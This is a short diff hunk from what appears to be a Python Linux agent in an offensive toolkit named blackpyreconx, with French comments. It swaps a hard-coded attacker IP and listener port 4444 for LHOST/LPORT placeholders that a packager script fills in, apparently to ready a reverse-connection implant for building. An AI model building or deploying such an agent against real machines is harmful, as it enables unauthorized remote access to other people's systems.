@@ -10,9 +10,9 @@ LOG_DIR = Path.home() / ".blackpyreconx"
 LOG_DIR.mkdir(parents=True, exist_ok=True)
 LOG_FILE = LOG_DIR / "agent_linux.log"
 
-# 📡 IP de l’attaquant (modifie selon ton setup)
-ATTACKER_IP = "192.168.1.100"  # Machine d'écoute (Kali, Parrot…)
-ATTACKER_PORT = 4444           # Port d'écoute
+# 📡 Placeholders LHOST / LPORT (remplacés par packager.py)
+ATTACKER_IP = LHOST_PLACEHOLDER
+ATTACKER_PORT = LPORT_PLACEHOLDER
 
 def log(msg: str):
     """Journalisation avec timestamp"""
